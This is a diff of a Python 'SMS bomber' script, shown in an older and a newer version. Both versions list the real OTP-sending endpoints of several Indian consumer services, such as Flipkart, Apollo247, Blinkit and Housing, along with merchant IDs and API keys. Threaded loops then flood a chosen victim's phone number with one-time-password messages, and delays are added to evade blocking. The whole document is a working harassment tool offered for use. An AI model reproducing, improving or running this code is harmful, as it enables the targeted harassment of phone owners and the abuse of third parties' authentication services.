@@ -7,134 +7,120 @@ import threading
 G = "\033[92m" # Green
 R = "\033[91m" # Red
 Y = "\033[93m" # Yellow
-C = "\033[96m" # Cyan
 W = "\033[0m"  # White
 
 success_count = 0
 failed_count = 0
 
-# --- 1. RESEARCHED API DATABASE ---
-def get_apis(target):
-    return [
-        {"name": "Housing", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": target}},
-        {"name": "ConfirmTkt", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/register", "params": {"newOtp": "true", "mobileNumber": target}},
-        {"name": "Flipkart", "method": "POST", "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", "json": {"loginId": "+91" + target}},
-        
-        {
-            "name": "Mamaearth_Gokwik",
-            "method": "POST",
-            "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
-            "json": {"phone": target, "country": "in", "country_code": "+91"},
-            "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
-        },
-        {
-            "name": "Apollo247",
-            "method": "POST",
-            "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
-            "json": {"loginType": "PATIENT", "mobileNumber": "+91" + target},
-            "headers": {"X-Apollo-Pre-Auth-Key": "d8e788e0-4c4c-4e8c-8c8c-4c4c4e8c8c8c", "Origin": "https://www.apollo247.com"}
-        },
-        {
-            "name": "Blinkit",
-            "method": "POST",
-            "url": "https://blinkit.com/v1/user/otp/send",
-            "json": {"phone": target},
-            "headers": {"app_client": "consumer_web", "Origin": "https://blinkit.com"}
-        },
-        {
-            "name": "Grofers",
-            "method": "POST",
-            "url": "https://grofers.com/v2/accounts/",
-            "data": {"user_phone": target},
-            "headers": {"auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"}
-        }
-    ]
+# ---------------------------------------------------------
+# API DATABASE (Added Mamaearth, Apollo, Blinkit)
+# ---------------------------------------------------------
+SMS_APIS = [
+    {
+        "name": "Mamaearth_Gokwik",
+        "method": "POST",
+        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
+        "json": {"phone": "{target}", "country": "in", "country_code": "+91"},
+        "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
+    },
+    {
+        "name": "Apollo247",
+        "method": "POST",
+        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
+        "json": {"loginType": "PATIENT", "mobileNumber": "+91{target}"},
+        "headers": {"X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9..."} # <-- Yahan naya token dalein
+    },
+    {
+        "name": "Blinkit",
+        "method": "POST",
+        "url": "https://blinkit.com/v1/user/otp/send",
+        "json": {"phone": "{target}"},
+        "headers": {"app_client": "consumer_web", "Origin": "https://blinkit.com"}
+    },
+    {
+        "name": "Housing", 
+        "method": "POST", 
+        "url": "https://login.housing.com/api/v2/send-otp", 
+        "json": {"phone": "{target}"}
+    },
+    {
+        "name": "ConfirmTkt", 
+        "method": "GET", 
+        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
+        "params": {"newOtp": "true", "mobileNumber": "{target}"}
+    },
+    {
+        "name": "Flipkart", 
+        "method": "POST", 
+        "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", 
+        "json": {"loginId": "+91{target}"}
+    }
+]
 
-# --- 2. SENDER FUNCTION ---
-def send_otp(api, session, common_headers):
+def send_otp(api, target):
     global success_count, failed_count
-    try:
-        current_headers = common_headers.copy()
-        if "headers" in api:
-            current_headers.update(api["headers"])
-
-        if api["method"] == "GET":
-            res = session.get(api["url"], params=api.get("params"), headers=current_headers, timeout=10)
-        else:
-            res = session.post(api["url"], json=api.get("json"), data=api.get("data"), headers=current_headers, timeout=10)
-        
-        if res.status_code in [200, 201, 202]:
-            success_count += 1
-            print(f"{G}[+] SUCCESS: {api['name']}{W}")
-        else:
-            failed_count += 1
-    except:
-        failed_count += 1
-
-# --- 3. MAIN UI & LOGIC ---
-def main():
-    os.system("clear")
-    print(f"{C}========================================{W}")
-    print(f"{G}      🚀 ADVANCE API BOMBER v20.0       {W}")
-    print(f"{C}========================================{W}\n")
     
-    # OLD STYLE INPUTS (ALAG-ALAG LINES)
-    print(f"{Y}--- Enter Target Info ---{W}")
-    target = input(f"{G}Enter Target Number: {W}")
-    limit = input(f"{G}Enter SMS Limit    : {W}")
-    
-    print(f"\n{Y}--- Select Speed Mode ---{W}")
-    print(f"{C}1. Serial Mode (Safe & Slow){W}")
-    print(f"{C}2. Threading Mode (Fast/Turbo){W}")
-    mode = input(f"{G}Choice: {W}")
-
-    # Validations
-    if not target or not limit:
-        print(f"{R}\n[!] Error: Number ya Limit nahi dali!{W}")
-        return
-    
-    limit = int(limit)
-    common_headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
-        "Accept": "application/json",
+    # Base Headers
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
         "Content-Type": "application/json"
     }
-
-    bot_session = requests.Session()
-    print(f"\n{Y}[*] Attack Started on: {C}{target}{W}\n")
     
-    sent = 0
-    while sent < limit:
-        apis = get_apis(target)
+    # Custom Headers update logic
+    if "headers" in api:
+        headers.update(api["headers"])
+    
+    try:
+        url = api["url"].replace("{target}", target)
         
-        if mode == "1":
-            # Serial Mode
-            for api in apis:
-                if sent >= limit: break
-                send_otp(api, bot_session, common_headers)
-                sent += 1
-                time.sleep(1)
-        else:
-            # Threading Mode
-            threads = []
-            for api in apis:
-                if sent >= limit: break
-                t = threading.Thread(target=send_otp, args=(api, bot_session, common_headers))
-                t.start()
-                threads.append(t)
-                sent += 1
-            for t in threads: t.join()
-            time.sleep(2) # Ban protection
+        # Replacement Logic for JSON
+        json_p = None
+        if "json" in api:
+            json_str = str(api["json"]).replace("{target}", target).replace("'", '"')
+            import json
+            json_p = json.loads(json_str)
 
-    print(f"\n{C}========================================{W}")
-    print(f"{G}           ATTACK FINISHED             {W}")
-    print(f"{C}========================================{W}")
-    print(f"{G}Total Successful: {success_count}{W}")
-    print(f"{R}Total Failed    : {failed_count}{W}")
-    print(f"{C}========================================{W}")
+        # Replacement Logic for Params
+        params_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None
+
+        if api["method"] == "GET":
+            res = requests.get(url, params=params_p, headers=headers, timeout=10)
+        else:
+            res = requests.post(url, json=json_p, headers=headers, timeout=10)
+
+        # Success Check
+        if res.status_code in [200, 201, 202] or "success" in res.text.lower():
+            print(f"{G}[SUCCESS]{W} {api['name']} sent OTP to {target}")
+            success_count += 1
+        else:
+            print(f"{R}[FAILED]{W} {api['name']} - Status: {res.status_code}")
+            failed_count += 1
+            
+    except Exception as e:
+        print(f"{Y}[ERROR]{W} {api['name']} connection error")
+        failed_count += 1
+
+def start_bombing(target, count):
+    print(f"\n{Y}[!] Bombing started on {target}...{W}\n")
+    threads = []
+    
+    for i in range(count):
+        api = SMS_APIS[i % len(SMS_APIS)] # APIs repeat hongi agar count zyada hai
+        t = threading.Thread(target=send_otp, args=(api, target))
+        t.start()
+        threads.append(t)
+        time.sleep(0.2) # Thoda gap taaki server block na kare
+
+    for t in threads:
+        t.join()
+
+    print(f"\n{G}--- BOMBING FINISHED ---{W}")
+    print(f"{G}Success: {success_count}{W} | {R}Failed: {failed_count}{W}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Attack Stopped by User.{W}")
+    os.system('clear')
+    print(f"{Y}--- CUSTOM SMS BOMBER ---{W}")
+    target_num = input(f"\n{W}Target Number (Without +91): {G}")
+    sms_count = int(input(f"{W}Number of SMS to send: {G}"))
+    
+    start_bombing(target_num, sms_count)
